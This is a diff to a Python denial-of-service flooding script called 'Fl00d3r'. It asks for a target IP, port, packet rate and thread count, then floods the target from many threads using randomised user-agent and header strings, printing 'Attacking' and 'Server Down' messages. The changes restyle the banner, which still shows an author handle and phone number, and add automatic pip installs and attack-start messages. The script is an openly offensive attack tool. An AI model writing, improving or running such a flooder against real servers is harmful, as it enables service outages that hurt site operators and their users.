@@ -3,6 +3,7 @@
 #Usage in a bad intention may cause serious life-problems
 #
 #
+import os
 import socket, requests
 import random
 import threading
@@ -12,6 +13,7 @@ import colorama
 from colorama import Fore, Style
 #
 #
+
 def delay_print(s):
     for c in s:
         sys.stdout.write(c)
@@ -21,22 +23,30 @@ def delay_print(s):
 #
 def display_banner():
     delay_print(f'''{Fore.YELLOW}
-
- _______  __        ___     ___    _______   ____   .______      
-|   ____||  |      / _ \   / _ \  |       \ |___ \  |   _  \     
-|  |__   |  |     | | | | | | | | |  .--.  |  __) | |  |_)  |    
-|   __|  |  |     | | | | | | | | |  |  |  | |__ <  |      /     
-|  |     |  `----.| |_| | | |_| | |  '--'  | ___) | |  |\  \----.
-|__|     |_______| \___/   \___/  |_______/ |____/  | _| `._____|
-
+********************
+   __ _  ___   ___      _ ____       
+  / _| |/ _ \ / _ \    | |___ \      
+ | |_| | | | | | | | __| | __) |_ __ 
+ |  _| | | | | | | |/ _` ||__ <| '__|
+ | | | | |_| | |_| | (_| |___) | |   
+ |_| |_|\___/ \___/ \__,_|____/|_|   
+                                     
+                                     
 Coded by 47hx1-53r
 Fl00d3r v1.0
 Phone : +918606672509
 
+********************
 ''')
 
 
 display_banner()
+press  = input("[+] Press any key to install the requirements first : ")
+os.system("clear")
+delay_print(f" {Fore.CYAN}Installing requirements . . .")
+os.system("pip3 install colorama")
+os.system("pip3 install requests")
+os.system("clear")
 
 useragents = ["Mozilla/5.0 (Android; Linux armv7l; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 Fennec/10.0.1",
               "Mozilla/5.0 (Android; Linux armv7l; rv:2.0.1) Gecko/20100101 Firefox/4.0.1 Fennec/2.0.1",
@@ -67,11 +77,15 @@ acceptall = [
     "Accept: text/html, application/xhtml+xml, image/jxr, */*\r\nAccept-Encoding: gzip\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\n"
     "Accept-Charset: utf-8, iso-8859-1;q=0.5\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\n",
     "Accept-Language: en-US,en;q=0.5\r\n"]
-
+display_banner()
 ip = str(input(f'{Fore.WHITE}[+] Target IP: '))
 port = int(input(f'{Fore.WHITE}[+] Port: '))
 pack = int(input(f'{Fore.WHITE}[+] Packet/s: '))
 thread = int(input(f'{Fore.WHITE}[+] Threads: '))
+os.system("clear")
+print("")
+delay_print(f"Make sure you are connected to a faster internet connection\n{Fore.GREEN}Initialising the attack . . .\nPlease wait . . .")
+
 
 
 def start():
@@ -96,7 +110,7 @@ def start():
             print("[+] Attacking {0}:{1} | Sent: {2}".format(str(ip), int(port), xx))
         except:
             s.close()
-            print(f'{Fore.CYAN}[+] Server Down | Press ctrl+c to stop\n')
+            print(f'{Fore.CYAN}[+] Server Down | Press ctrl+c to stop')
 
 
 for x in range(thread):
